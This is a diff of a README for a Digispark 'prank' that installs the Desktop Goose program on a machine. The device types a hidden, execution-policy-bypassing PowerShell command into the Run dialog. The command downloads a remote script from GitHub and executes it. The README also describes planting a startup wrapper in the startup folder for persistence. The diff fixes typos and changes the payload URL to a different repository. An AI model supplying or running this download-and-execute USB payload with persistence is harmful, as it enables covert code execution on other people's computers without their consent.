@@ -3,7 +3,7 @@ Goose program prank install wrapper for digispark. Keeping the link short for sp
 
 See here for the original program https://desktop-goose.en.uptodown.com/windows
 
-My code is intended to allow a digispart to plugin, quickly type the initial payload, and unplug while the code sets up the rest in the background.
+My code is intended to allow a digispark to plug in, quickly type the initial payload, and unplug while the code sets up the rest in the background.
 
 The intent is to create a startup wrapper, placing it in the shell:startup folder. 
 
@@ -15,4 +15,4 @@ The intent is to create a startup wrapper, placing it in the shell:startup folde
 
 ---
 
-To run, just have a digispark run `powershell -W H -Ex B -c "iex (iwr 'https://github.com/Reginald-Gillespie/G/raw/main/i.ps1').Content"` in the Run Dialogue. Later I may make the initial script rerun the main script as a hidden window.
+To run, just have a digispark run `powershell -W H -Ex B -c "iex (iwr 'https://github.com/smcbride-ca/G/raw/test/i.ps1').Content"` in the Run Dialogue. Later I may make the initial script rerun the main script as a hidden window.
